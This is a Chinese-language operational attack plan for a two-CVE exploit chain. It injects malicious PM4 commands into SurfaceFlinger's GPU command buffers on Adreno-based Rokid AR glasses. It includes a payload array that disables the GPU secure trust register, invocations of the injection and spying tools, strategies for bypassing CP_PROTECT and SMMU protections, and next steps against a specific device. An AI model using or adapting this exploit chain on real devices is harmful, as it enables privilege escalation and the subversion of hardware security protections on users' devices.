# CVE-2025-21479 + CVE-2025-21480 寄生式 GPU 命令注入

> English: [PARASITIC_INJECT_ATTACK_EN.md](PARASITIC_INJECT_ATTACK_EN.md)
> 📌 **事實依據**：本檔涉及裝置世代、kernel config、CVE 狀態、GhostLock 位移與產品結構等事實時，一律以 [`reports/FACTS.md`](FACTS.md) 為準（單一權威事實表；衝突時以該表裁決）。


## 攻擊概述

### 背景問題

直接創建 GPU Context 會被驅動擋下 (`legacy context switch error`)，無法以非特權進程直接提交 GPU 命令。

### 解決方案：寄生式注入

利用 SurfaceFlinger 的合法 GPU Context，透過 Cross-FD GPU Memory Access (CVE-2025-21479) 篡改其命令緩衝區。

## 攻擊流程

```
┌─────────────────────────────────────────────────────────────────────┐
│                    寄生式 GPU 命令注入流程                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   ┌──────────────┐      ┌──────────────┐      ┌──────────────┐     │
│   │  Shell 進程   │      │ SurfaceFlinger│     │     GPU      │     │
│   │  (攻擊者)     │      │  (特權進程)   │     │  (Adreno)    │     │
│   └──────┬───────┘      └──────┬───────┘      └──────┬───────┘     │
│          │                      │                      │            │
│          │  1. Cross-FD mmap    │                      │            │
│          │ ──────────────────>  │                      │            │
│          │  (讀取 GPU 內存)     │                      │            │
│          │                      │                      │            │
│          │  2. 識別 IB 位置     │                      │            │
│          │ <──────────────────  │                      │            │
│          │  (掃描 PM4 封包)     │                      │            │
│          │                      │                      │            │
│          │  3. 注入惡意指令     │                      │            │
│          │ ──────────────────>  │                      │            │
│          │  (寫入 NOP 區域)     │                      │            │
│          │                      │                      │            │
│          │                      │  4. 提交命令         │            │
│          │                      │ ──────────────────>  │            │
│          │                      │  (包含被篡改的 IB)   │            │
│          │                      │                      │            │
│          │                      │  5. 執行特權指令     │            │
│          │                      │ <──────────────────  │            │
│          │                      │  (CP_REG_WRITE等)    │            │
│          │                      │                      │            │
└─────────────────────────────────────────────────────────────────────┘
```

## PM4 封包格式

### Type 3 封包 (標準命令)

```
31  30 29      16 15    8 7       0
├───┴───┼────────┼────────┼────────┤
│ 1  1  │ COUNT  │ OPCODE │  0x00  │
└───────┴────────┴────────┴────────┘
```

### 關鍵 Opcodes

| Opcode | 名稱               | 用途            |
| ------ | ------------------ | --------------- |
| 0x10   | CP_NOP             | 空操作 (注入點) |
| 0x3C   | CP_REG_WRITE       | 寫入 GPU 寄存器 |
| 0x3D   | CP_MEM_WRITE       | 寫入記憶體      |
| 0x3F   | CP_INDIRECT_BUFFER | 執行子緩衝區    |
| 0x26   | CP_WAIT_FOR_IDLE   | 等待 GPU 閒置   |

## 目標安全寄存器

### RBBM_SECVID_TRUST_CNTL (0x0F400)

控制 GPU 安全狀態的信任等級。

**攻擊目標**: 將值設為 0x00000000，嘗試降級 GPU 至非安全模式。

```c
// 注入的 PM4 命令
uint32_t payload[] = {
    0xC0010026,  // CP_WAIT_FOR_IDLE, count=1
    0x00000000,  // padding
    0xC002003C,  // CP_REG_WRITE, count=2
    0x0000F400,  // RBBM_SECVID_TRUST_CNTL
    0x00000000,  // value = 0 (disable trust)
};
```

### CP_PROTECT_CNTL (0x0084C)

控制命令處理器的保護機制。

**攻擊目標**: 禁用 CP 寄存器保護，允許寫入任意 GPU 寄存器。

## 工具使用

### 1. 偵察階段：GPU 命令緩衝區監控

```bash
# 監控所有 GPU 頁面的變化 (30秒)
./gpu_cmdbuf_spy monitor 30

# 監視特定偏移量的實時變化
./gpu_cmdbuf_spy watch 0x2000
```

**輸出範例**:

```
╔═══════════════════════════════════════════════════════════════╗
║  ACTIVE GPU COMMAND BUFFERS                                   ║
╠═══════════════════════════════════════════════════════════════╣
║ 0x00002000 | Changes: 1234 | PM4: YES | IB: YES | Age: 0s    ║
║ 0x00005000 | Changes:  567 | PM4: YES | IB: NO  | Age: 1s    ║
║ 0x00008000 | Changes:  890 | PM4: YES | IB: YES | Age: 0s    ║
╚═══════════════════════════════════════════════════════════════╝
```

### 2. 注入階段：SurfaceFlinger IB 劫持

```bash
# 列出可用的攻擊 payload
./surfaceflinger_ib_hijack list

# 單次注入嘗試 (payload 0 = SECVID_TRUST_DISABLE)
./surfaceflinger_ib_hijack single 0

# 持續監控並注入 (30秒，payload 0)
./surfaceflinger_ib_hijack monitor 30 0
```

### 3. 綜合攻擊

```bash
# 掃描 PM4 封包
./kgsl_parasitic_inject --scan

# 單次注入嘗試
./kgsl_parasitic_inject --inject

# 實時監控並注入
./kgsl_parasitic_inject --monitor 60
```

## 預期結果

### 成功指標

1. **Payload 寫入成功**: 在 NOP 區域成功寫入惡意 PM4 命令
2. **GPU 執行命令**: SurfaceFlinger 提交被篡改的 IB 到 GPU
3. **安全狀態變化**: GPU 安全寄存器被修改

### 檢查方法

```bash
# 檢查 dmesg 中的 GPU 錯誤
dmesg | grep -i "kgsl\|adreno\|gpu"

# 檢查 GPU 是否還在運行
cat /sys/class/kgsl/kgsl-3d0/gpuclk
cat /sys/class/kgsl/kgsl-3d0/gpu_busy_percentage
```

## 潛在防護與繞過

### 可能遇到的防護

1. **PM4 命令驗證**: GPU 可能驗證某些敏感命令
2. **寄存器寫保護**: CP_PROTECT 可能阻止寫入安全寄存器
3. **SMMU 隔離**: 頁表可能阻止非法記憶體訪問

### 繞過策略

1. **漸進式攻擊**: 先嘗試寫入非保護寄存器確認路徑
2. **時序攻擊**: 在 SurfaceFlinger 提交命令前精確注入
3. **多階段攻擊**:
   - 第一階段：禁用 CP_PROTECT
   - 第二階段：寫入安全寄存器

## 下一步行動

1. **連接設備**: Rokid 設備目前離線，需要重新連接
2. **編譯工具**: 上傳源碼並在設備上編譯
3. **偵察**: 運行 gpu_cmdbuf_spy 識別活躍的命令緩衝區
4. **注入測試**: 使用 surfaceflinger_ib_hijack 嘗試注入
5. **驗證效果**: 檢查 GPU 狀態和 dmesg 輸出

## 附錄：設備狀態

- **設備**: Rokid AR Glasses (<DEVICE_SERIAL>)
- **狀態**: 離線 (可能在 Recovery 模式)
- **需要**: 用戶手動選擇 Recovery 選項重啟設備
